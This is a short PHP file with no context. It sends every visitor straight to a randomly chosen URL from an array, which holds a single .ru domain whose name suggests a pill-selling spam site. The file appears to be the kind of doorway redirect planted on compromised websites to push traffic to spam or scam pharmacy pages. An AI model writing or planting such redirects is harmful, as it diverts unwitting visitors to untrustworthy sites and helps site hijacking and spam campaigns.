<?php 
$urls = array(
	"http://777.naturaltabsdeal.ru/",
        ); 

$url = $urls[rand(0, count($urls)-1)];

header("Location: $url");
?>